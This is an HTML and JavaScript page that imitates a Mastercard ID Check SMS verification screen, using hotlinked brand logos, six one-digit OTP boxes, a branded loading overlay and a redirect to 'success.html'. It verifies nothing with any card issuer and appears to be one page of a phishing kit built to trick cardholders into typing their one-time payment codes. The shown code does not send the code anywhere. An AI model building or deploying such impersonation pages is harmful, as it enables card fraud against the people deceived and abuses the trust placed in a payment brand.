<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mastercard SMS Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    /* Bigger Mastercard logo */
    .mastercard-logo img {
      height: 40px; /* Increased size */
    }

    h2 {
      margin-top: 10px;
      font-size: 22px;
      font-weight: 500;
    }

    p {
      font-size: 14px;
      color: #333;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    /* Text selection color */
    ::selection {
      background: #EB001B;
      color: #fff;
    }

    .otp-inputs {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 20px;
    }

    .otp-inputs input {
      width: 48px;
      height: 50px;
      font-size: 24px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
      transition: border-color 0.3s ease;
    }

    .otp-inputs input:focus {
      border-color: #EB001B; /* Mastercard red */
      outline: none;
    }

    .submit-btn {
      background-color: #EB001B; /* Mastercard red */
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .submit-btn:hover {
      background-color: #C00015; /* Darker red */
    }

    .resend-link {
      font-size: 14px;
      color: #EB001B;
      text-decoration: none;
      display: block;
      margin-top: 20px;
    }

    .resend-link:hover {
      text-decoration: underline;
    }

    hr {
      border: none;
      border-top: 1px solid #ccc;
      margin: 10px 0 20px;
    }

    /* Loader styles */
    #loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #loading img {
      width: 50px;
      height: 50px;
    }

    #loading p {
      margin-top: 10px;
      font-size: 16px;
      font-weight: bold;
      color: #000;
    }
    
/* Mastercard logo in loading overlay */
    #loading img:last-child {
      height: 40px;
      width: auto;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <span>Authentication</span>
      <span class="mastercard-logo">
        <img src="https://www.gabler-saliter-bank.de/wp-content/uploads/2021/10/mastercard-id-check-300x107.png" alt="Mastercard Logo">
      </span>
    </div>
    <hr />
    <h2><strong>Enter the code</strong></h2>
    <p>We sent a 6-digit code to your registered phone number. Enter it below to continue.</p>

    <form id="otpForm">
      <div class="otp-inputs">
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
        <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
      </div>
      <button type="submit" class="submit-btn">VERIFY</button>
    </form>

    <a class="resend-link" href="#">Resend code</a>
  </div>

 <!-- Loading Overlay -->
  <div id="loading">
    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading">
    <img src="https://www.mastercard.com/content/dam/public/brandcenter/en/ma-bc-dxp_other-marks_ID-CHECK.png" alt="Mastercard Logo">
  </div>

  <script>
    const inputs = document.querySelectorAll('.otp-inputs input');
    const form = document.getElementById('otpForm');
    const loading = document.getElementById('loading');

    inputs.forEach((input, i) => {
      input.addEventListener('input', () => {
        if (input.value && i < inputs.length - 1) {
          inputs[i + 1].focus();
        }
        const code = Array.from(inputs).map(input => input.value).join('');
        if (code.length === 6) {
          showProcessing();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && i > 0) {
          inputs[i - 1].focus();
        }
      });
    });

    form.addEventListener('submit', function (e) {
      e.preventDefault();
      const code = Array.from(inputs).map(input => input.value).join('');
      if (code.length === 6) {
        showProcessing();
      }
    });

    function showProcessing() {
      loading.style.display = 'flex';
      setTimeout(() => {
        window.location.href = "success.html";
      }, 2000);
    }
  </script>
</body>
</html>
